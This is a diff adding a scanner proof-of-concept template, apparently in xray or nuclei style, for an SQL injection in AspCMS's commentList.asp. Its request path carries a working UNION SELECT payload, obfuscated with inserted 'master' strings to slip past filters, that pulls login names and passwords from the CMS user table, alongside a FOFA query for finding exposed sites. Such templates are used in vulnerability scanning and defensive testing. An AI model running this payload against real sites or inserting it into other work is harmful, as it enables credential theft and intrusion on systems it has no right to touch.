@@ -1,0 +1,15 @@
+id: poc-yaml-aspcms-commentlist-asp-sqli
+info:
+  name: AspCMS系统 commentList.asp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: aspcms
+  fofa: app="ASPCMS"
+requests:
+- method: GET
+  path: /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
+  expression: "status_code == 200 && \ncontains(body,\"发表于\") &&\ncontains(body,\"\
+    评论者\") &&\nmatches(body,`<div class=\"line2\">.*?</div>`)\n"
+variables: {}
+transport: http
